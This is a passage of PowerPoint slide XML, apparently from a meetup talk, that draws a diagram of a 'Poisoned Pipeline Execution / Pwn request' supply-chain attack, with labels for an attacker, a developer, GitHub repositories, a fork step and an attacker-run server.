            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
                <a:t>Attacker</a:t>
              </a:r>
              <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1027" name="Groupe 1026">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{894843B0-30E2-A8CC-DF0B-1BEE5D590EAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="198005" y="3357685"/>
            <a:ext cx="2160000" cy="1178768"/>
            <a:chOff x="187372" y="3251355"/>
            <a:chExt cx="2160000" cy="1178768"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="1026" name="Picture 2" descr="Laptop - Free computer icons">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72814BB2-E153-6A09-F6AF-E860F9919B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283" y="365869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omputer User Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3069FA1F-38DA-FEC6-2A6C-07CF4FE50C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372" y="3607266"/>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58" name="ZoneTexte 57">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6F3A423-9D92-F1EA-F878-7611A28EDDB1}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="187372" y="3251355"/>
              <a:ext cx="216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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1041" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D532DE0B-FE02-4C95-8974-25C352226108}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6551764" y="944230"/>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042" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{679D7219-ED45-BF4F-5DD9-E02F5FA94220}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86772" y="944230"/>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043" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C00899F8-AB73-A598-E8C5-6E6E2E4CF7FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86772" y="3246423"/>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044" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE46F227-7112-3F4C-E610-7038E4F4634F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3319268" y="3246423"/>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045" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9A20585-D122-4F25-5D3C-6E29D40DB449}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9784260" y="944230"/>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048" name="Ellipse 1047">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F10119C-15ED-9215-2D7A-847F8D1056AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3773034" y="2636047"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1049" name="Ellipse 1048">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EF0664E-E433-CD79-8BE5-80A595A347AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3063809" y="5254763"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1050" name="Ellipse 1049">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3ED2256-7364-3561-F874-2F7A9A6E890D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6257126" y="4149953"/>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3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1051" name="Ellipse 1050">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD91B8BF-E285-74C2-A17E-504343E6A67A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2090577" y="5684229"/>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4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1052" name="Ellipse 1051">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BDD51181-6DA9-F584-FBB2-55657ACF2134}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5676304" y="6102241"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1054" name="Connecteur droit 1053">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5BB4C4D9-E98E-167E-99EC-349788EC6966}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86772" y="4614422"/>
            <a:ext cx="0" cy="1548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56" name="Connecteur droit 1055">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5A15DB8C-883D-02F4-1573-CC12693FD436}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86772" y="2289964"/>
            <a:ext cx="0" cy="540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57" name="Connecteur droit 1056">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55B5F4E1-521D-6482-152D-B77C0A0A92F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6548889" y="2297280"/>
            <a:ext cx="0" cy="540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59" name="Connecteur droit 1058">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C16F906F-04BC-DF2D-BC57-A14697499C3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9783103" y="2291570"/>
            <a:ext cx="0" cy="3960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60" name="Connecteur droit 1059">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7CDB664-7150-7042-F3F6-51A677712E12}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="107098" y="3146895"/>
            <a:ext cx="119160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234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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Poisoned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> Pipeline Execution / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Pwn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>request</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDFB85A0-2316-834B-BE29-C2E2BEC8C1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4" t="7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6759307" y="1859911"/>
            <a:ext cx="360000" cy="359375"/>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1C596711-4B05-3534-53E7-D0E47375F968}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4208480" y="1855004"/>
            <a:ext cx="1720886" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://github.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4990178E-054C-BC46-589D-8C070C206D29}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4078300" y="1744330"/>
            <a:ext cx="3365014" cy="4168787"/>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1026" name="Picture 2" descr="Github - Free logo icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AB5DC26-65F9-8E19-CFA3-43E4B08AC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8433" y="1871541"/>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1CC5BC16-9C83-DEC5-3C6A-43646A7D9157}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4174619" y="4230947"/>
            <a:ext cx="3211495" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>meetup-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>supply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>chain-attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>/some-repo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48D5A146-B039-0218-9856-D1DDF02857C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="191547" y="1744330"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="16" name="Groupe 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B87B5F0-548B-B5D6-D7EA-C81087211A6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="283730" y="1838966"/>
            <a:ext cx="2160000" cy="1046866"/>
            <a:chOff x="349612" y="1188253"/>
            <a:chExt cx="2160000" cy="1046866"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="17" name="Picture 12" descr="Crime Hacker Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9159BEB0-295E-E634-501D-17BE5EF0368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612" y="1557295"/>
              <a:ext cx="720000" cy="63564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Laptop - Free computer icons">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7859906A-8C79-3DE0-D226-B5D63A244C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8972" y="1515119"/>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ZoneTexte 18">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{81E429E6-FD3A-1606-3139-853394F26A61}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="349612" y="1188253"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
                <a:t>Attacker</a:t>
              </a:r>
              <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="ZoneTexte 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77383AF7-863E-E7B6-D636-409E427481C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4153280" y="2381331"/>
            <a:ext cx="1849420" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>avergnaud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>some</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>-repo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1036" name="Picture 12" descr="Merge Generic Gradient icon | Freepik">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51527FDB-B5D4-5DCC-4E1F-282C413304D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8433" y="2381331"/>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23" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4019588-3949-2EB4-34D8-64980A340BF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9069468" y="1727947"/>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4" name="ZoneTexte 23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8FD3AEDA-C65E-3F07-F52B-753351A56A97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9183566" y="1855053"/>
            <a:ext cx="2160000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://attacker.appsec.cc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1038" name="Picture 14" descr="Pull request - Free ui icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E9D6224-2E75-B74D-271B-EAF1ADD1ED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065" y="3394513"/>
            <a:ext cx="360000" cy="360000"/>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e 26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{620CF862-CAA6-9B95-40EB-66DD561634E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="283730" y="4281610"/>
            <a:ext cx="2160000" cy="1178768"/>
            <a:chOff x="187372" y="3251355"/>
            <a:chExt cx="2160000" cy="1178768"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="28" name="Picture 2" descr="Laptop - Free computer icons">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18892CE8-B89B-4DC1-576E-F13D4106AE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283" y="365869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0" descr="Computer User Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A871B5A-371E-A489-6F0E-F441CB93FC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372" y="3607266"/>
              <a:ext cx="720000" cy="822857"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="ZoneTexte 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{305D9AC8-4253-A4D0-0D3F-F8FE132A2D9A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="187372" y="3251355"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
                <a:t>Software </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
                <a:t>developer</a:t>
              </a:r>
              <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6CE609C2-D4E4-B664-B3C0-6F14F63CC62A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="191547" y="4195576"/>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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="32" name="Connecteur droit avec flèche 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86A7C49C-378B-E6CE-E4EA-C86D7D732ADD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2619414" y="2549697"/>
            <a:ext cx="1332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 name="Ellipse 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00FF538D-86BF-77D4-C5FB-63C3588BBAC7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3123414" y="2609432"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="ZoneTexte 33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E744F9A-E649-1541-9669-985EAB6BDDBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2560092" y="2203932"/>
            <a:ext cx="1450645" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Forks repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Organigramme : Multidocument 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D2189C7-785F-206D-B61E-7A22FC87B21F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5356841" y="3230669"/>
            <a:ext cx="360000" cy="462334"/>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6" name="ZoneTexte 35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59FA9ABD-BDB1-1ABE-E70B-D9B2E1E61166}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4739760" y="2917293"/>
            <a:ext cx="1904893" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
